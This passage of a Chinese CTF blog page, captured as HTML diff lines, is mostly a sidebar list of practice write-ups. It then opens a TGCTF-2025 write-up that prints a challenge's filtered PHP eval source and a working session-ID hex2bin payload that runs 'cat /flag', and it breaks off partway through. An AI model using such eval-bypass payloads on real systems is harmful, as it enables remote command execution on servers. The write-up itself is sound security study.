+            <span class="post-title" title="极客大挑战2019-FinalSQL">极客大挑战2019-FinalSQL</span>
+            <span class="post-date" title="2025-03-29 18:32:48">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/ASIS2019-Unicorn-shop/"
+           data-tag="刷题笔记,unicode"
+           data-author="" >
+            <span class="post-title" title="ASIS2019-Unicorn-shop">ASIS2019-Unicorn-shop</span>
+            <span class="post-date" title="2025-03-29 01:34:44">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/NPUCTF2020-ReadlezPHP/"
+           data-tag="刷题笔记,php特性,assert和eval,动态调用方法"
+           data-author="" >
+            <span class="post-title" title="NPUCTF2020-ReadlezPHP">NPUCTF2020-ReadlezPHP</span>
+            <span class="post-date" title="2025-03-29 01:34:13">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-RCE-ME/"
+           data-tag="刷题笔记,无字母数字RCE,异或绕过,取反绕过"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-RCE-ME">极客大挑战2019-RCE-ME</span>
+            <span class="post-date" title="2025-03-29 01:33:00">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/29/SWPU2019-Web1/"
+           data-tag="刷题笔记,sql注入,无列名注入,二次注入,MariaDB数据库"
+           data-author="" >
+            <span class="post-title" title="SWPU2019-Web1">SWPU2019-Web1</span>
+            <span class="post-date" title="2025-03-29 01:32:39">2025/03/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap/"
+           data-tag="刷题笔记,nmap,escapeshellarg和escapeshellcmd函数的绕过"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020朱雀组-Nmap">网鼎杯2020朱雀组-Nmap</span>
+            <span class="post-date" title="2025-03-28 22:26:14">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A21/"
+           data-tag="刷题笔记,信息搜集,python脚本编写"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-高明的黑客1">强网杯2019-高明的黑客1</span>
+            <span class="post-date" title="2025-03-28 21:33:56">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easy-serialize-php1/"
+           data-tag="刷题笔记,php反序列化,字符串逃逸,extract覆盖函数"
+           data-author="" >
+            <span class="post-title" title="安洵杯2019-easy_serialize_php1">安洵杯2019-easy_serialize_php1</span>
+            <span class="post-date" title="2025-03-28 20:49:15">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/28/ez-php/"
+           data-tag="刷题笔记,php反序列化,特殊变量名传参,gc回收,反序列化逃逸"
+           data-author="" >
+            <span class="post-title" title="ez_php">ez_php</span>
+            <span class="post-date" title="2025-03-28 16:41:00">2025/03/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/27/Sql-Inject-or-RCE/"
+           data-tag="刷题笔记,sql注入,堆叠注入,handler读表,delimiter更改sql语句结束符"
+           data-author="" >
+            <span class="post-title" title="Sql-Inject-or-RCE">Sql-Inject-or-RCE</span>
+            <span class="post-date" title="2025-03-27 22:04:19">2025/03/27</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/27/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"
+           data-tag="刷题笔记,PHP原生类"
+           data-author="" >
+            <span class="post-title" title="PHP原生类">PHP原生类</span>
+            <span class="post-date" title="2025-03-27 21:39:53">2025/03/27</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/27/only-one-sql/"
+           data-tag="刷题笔记,sql盲注,sql注入"
+           data-author="" >
+            <span class="post-title" title="only-one-sql">only-one-sql</span>
+            <span class="post-date" title="2025-03-27 21:04:25">2025/03/27</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/26/%E5%A4%8D%E8%AF%BB%E6%9C%BA/"
+           data-tag="刷题笔记,ssti,chr函数构造命令"
+           data-author="" >
+            <span class="post-title" title="复读机">复读机</span>
+            <span class="post-date" title="2025-03-26 23:37:23">2025/03/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/26/%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82MD5/"
+           data-tag="刷题笔记,php特性,md5"
+           data-author="" >
+            <span class="post-title" title="所以你说你懂MD5?">所以你说你懂MD5?</span>
+            <span class="post-date" title="2025-03-26 21:36:42">2025/03/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/26/ez-php-jail/"
+           data-tag="刷题笔记,命令执行,glob函数"
+           data-author="" >
+            <span class="post-title" title="ez_php_jail">ez_php_jail</span>
+            <span class="post-date" title="2025-03-26 20:21:52">2025/03/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/25/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/"
+           data-tag="刷题笔记,php特性,md5,命令执行,intval"
+           data-author="" >
+            <span class="post-title" title="WUSTCTF2020-朴实无华1">WUSTCTF2020-朴实无华1</span>
+            <span class="post-date" title="2025-03-25 00:11:56">2025/03/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/24/ssti-flask-labs/"
+           data-tag="ssti,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ssti-flask-labs">ssti-flask-labs</span>
+            <span class="post-date" title="2025-03-24 19:06:24">2025/03/24</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/23/Flask%E5%BA%93%E5%AD%A6%E4%B9%A0/"
+           data-tag="学习笔记,Flask"
+           data-author="" >
+            <span class="post-title" title="Flask库学习">Flask库学习</span>
+            <span class="post-date" title="2025-03-23 16:10:30">2025/03/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/21/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"
+           data-tag="ssti,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ssti模版注入">ssti模版注入</span>
+            <span class="post-date" title="2025-03-21 21:17:45">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BUUCTF2018-OnlineTool1/"
+           data-tag="刷题笔记,escapeshellarg()和escapeshellcmd()、单引号逃逸"
+           data-author="" >
+            <span class="post-title" title="BUUCTF2018-OnlineTool1">BUUCTF2018-OnlineTool1</span>
+            <span class="post-date" title="2025-03-21 19:50:32">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"
+           data-tag="刷题笔记,php特性,${phpinfo()}"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-ZJCTF不过如此">BJDCTF2020-ZJCTF不过如此</span>
+            <span class="post-date" title="2025-03-21 19:04:56">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/"
+           data-tag="刷题笔记,命令执行,php反序列化,linux find -name模糊查询文件"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020朱雀组phpweb1">网鼎杯2020朱雀组phpweb1</span>
+            <span class="post-date" title="2025-03-20 23:56:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/BSidesCF2020Hadabadday1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="BSidesCF2020Hadabadday1">BSidesCF2020Hadabadday1</span>
+            <span class="post-date" title="2025-03-20 23:55:26">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
+           data-tag="刷题笔记,sql注入,ssrf,php反序列化"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
+            <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ctfshow-ssrf">ctfshow-ssrf</span>
+            <span class="post-date" title="2025-03-19 20:05:14">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-xxe/"
+           data-tag="学习笔记,xxe"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xxe">ctfshow-xxe</span>
+            <span class="post-date" title="2025-03-19 13:32:30">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/16/ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ssrf">ssrf</span>
+            <span class="post-date" title="2025-03-16 21:44:06">2025/03/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,php反序列化"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php序列化">ctfshow-php序列化</span>
+            <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/GXYCTF2019-BabySQli1/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
+            <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
+           data-tag="刷题笔记,文件包含,php反序列化"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020青龙组-AreUSerialz1">网鼎杯2020青龙组-AreUSerialz1</span>
+            <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
+            <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/12/RoarCTF2019-EasyCalc1/"
+           data-tag="刷题笔记,命令执行,waf绕过"
+           data-author="" >
+            <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
+            <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
+           data-tag="刷题笔记,sql注入,报错注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-HardSQL1">极客大挑战2019-HardSQL1</span>
+            <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
+           data-tag="刷题笔记,sql注入,堆叠注入"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-随便注1">强网杯2019-随便注1</span>
+            <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/08/ctfshow-sqli-labs/"
+           data-tag="学习笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
+            <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
+           data-tag="学习笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
+            <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/02/php%E7%89%B9%E6%80%A7/"
+           data-tag="php特性,学习笔记"
+           data-author="" >
+            <span class="post-title" title="php特性">php特性</span>
+            <span class="post-date" title="2025-03-02 20:14:41">2025/03/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/"
+           data-tag="php特性,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php特性">ctfshow-php特性</span>
+            <span class="post-date" title="2025-02-24 18:53:16">2025/02/24</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-xss/"
+           data-tag="学习笔记,xss"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xss">ctfshow-xss</span>
+            <span class="post-date" title="2025-02-23 17:12:49">2025/02/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="信息搜集,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
+            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow-命令执行">ctfshow-命令执行</span>
+            <span class="post-date" title="2025-02-17 00:00:48">2025/02/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,PHP反序列化漏洞"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化">PHP反序列化</span>
+            <span class="post-date" title="2025-02-14 00:51:53">2025/02/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="学习笔记,xss漏洞"
+           data-author="" >
+            <span class="post-title" title="xss漏洞总结">xss漏洞总结</span>
+            <span class="post-date" title="2025-02-12 03:30:15">2025/02/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/11/xss-labs/"
+           data-tag="学习笔记,xss漏洞"
+           data-author="" >
+            <span class="post-title" title="xss-labs">xss-labs</span>
+            <span class="post-date" title="2025-02-11 23:43:19">2025/02/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
+           data-tag="学习笔记,linux"
+           data-author="" >
+            <span class="post-title" title="linux基础命令">linux基础命令</span>
+            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="命令执行">命令执行</span>
+            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/ctfshow-web82/"
+           data-tag="文件包含,做题笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
+            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="文件包含,学习笔记"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
+            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/ctfshow-web160/"
+           data-tag="文件上传,做题笔记,日志包含"
+           data-author="" >
+            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
+            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
+           data-tag="文件上传,做题笔记"
+           data-author="" >
+            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
+            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/22/upload/"
+           data-tag="文件上传,学习笔记"
+           data-author="" >
+            <span class="post-title" title="upload">upload</span>
+            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,python"
+           data-author="" >
+            <span class="post-title" title="python学习笔记">python学习笔记</span>
+            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
+           data-tag="刷题笔记,http协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
+            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
+           data-tag="刷题笔记,filter伪协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
+            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
+            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
+           data-tag="刷题笔记,payload构造"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
+            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
+            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="学习笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/29/MySQL/"
+           data-tag="学习笔记,MySQL"
+           data-author="" >
+            <span class="post-title" title="MySQL">MySQL</span>
+            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,正则表达式"
+           data-author="" >
+            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
+            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,php"
+           data-author="" >
+            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
+            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,HTML"
+           data-author="" >
+            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
+            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/welcome/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="welcome">welcome</span>
+            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-TGCTF-2025复现" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">TGCTF-2025复现</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">sql注入</a>
+            
+            <a class="color5">比赛复现</a>
+            
+            <a class="color2">upload</a>
+            
+            <a class="color4">RCE</a>
+            
+            <a class="color4">CVE</a>
+            
+            <a class="color5">目录穿越</a>
+            
+            <a class="color4">内存马</a>
+            
+            <a class="color5">时间盲注</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-04-15 18:06:34'>2025-04-15 14:10</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:2.6k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89"><span class="toc-text">AAA偷渡阴平（复仇）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-upload"><span class="toc-text">(ez)upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME"><span class="toc-text">前端GAME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Plus"><span class="toc-text">前端GAME Plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFGAME-Ultra"><span class="toc-text">前端GAME Ultra</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TGCTF2025-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86"><span class="toc-text">TGCTF2025 后台管理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TG-wordpress"><span class="toc-text">TG_wordpress</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%86%9F%E6%82%89%E7%9A%84%E9%85%8D%E6%96%B9%EF%BC%8C%E7%86%9F%E6%82%89%E7%9A%84%E5%91%B3%E9%81%93"><span class="toc-text">熟悉的配方，熟悉的味道</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h1><p>源码：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"> <span class="hljs-variable">&lt;?php</span><br><span class="hljs-variable"></span><br><span class="hljs-variable"></span><br><span class="hljs-variable">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">localeconv</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">print</span>|<span class="hljs-string">var</span>|<span class="hljs-string">dump</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">get</span>|<span class="hljs-string">defined</span>|<span class="hljs-string">str</span>|<span class="hljs-string">split</span>|<span class="hljs-string">spl</span>|<span class="hljs-string">autoload</span>|<span class="hljs-string">extensions</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">phpversion</span>|<span class="hljs-string">floor</span>|<span class="hljs-string">sqrt</span>|<span class="hljs-string">tan</span>|<span class="hljs-string">cosh</span>|<span class="hljs-string">sinh</span>|<span class="hljs-string">ceil</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">dir</span>|<span class="hljs-string">getcwd</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">end</span>|<span class="hljs-string">next</span>|<span class="hljs-string">prev</span>|<span class="hljs-string">reset</span>|<span class="hljs-string">each</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">array</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">pop</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">content</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">readfile</span>|<span class="hljs-string">highlight</span>|<span class="hljs-string">show</span>|<span class="hljs-string">source</span>|<span class="hljs-string">file</span>|<span class="hljs-string">assert/i&quot;, $tgctf2025))&#123;</span><br><span class="hljs-string">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="hljs-string">    eval($tgctf2025);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">highlight_file(__FILE__);</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>这题就是之前那题的升级版，把无参数RCE给ban了，依旧是让我们去使用eval危险函数进行命令执行。</p>
+<p>当时做这题的时候感觉太难了做不了一点，结果发现题解就是学过的利用session进行无参数RCE，感觉天塌了，这都没想到，当时是以为要用什么其他方法无参RCE用不了。</p>
+<p><strong>利用session绕过</strong></p>
+<p>一定要先进行十六进制编码然后通过hex2bin函数解码才能执行命令</p>
+<p>payload：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">tgctf2025</span>=session_start();system(hex2bin(session_id()));<br><br>burpsuite抓包修改Cookie: <span class="hljs-attribute">PHPSESSID</span>=xxx<br><span class="hljs-attribute">PHPSESSID</span>=636174202f666c6167	 cat /flag的十六进制<br></code></pre></td></tr></table></figure>
+
+<p>其他解法（非预期）：</p>
+<p><strong>请求头绕过，只适用于apache服务器，功能与getallheaders()相似</strong></p>
+<p>注意：在用请求头绕过时，尽量把没用的请求头删了，不然会有报错</p>
+<p>首先了解几个函数的作用</p>
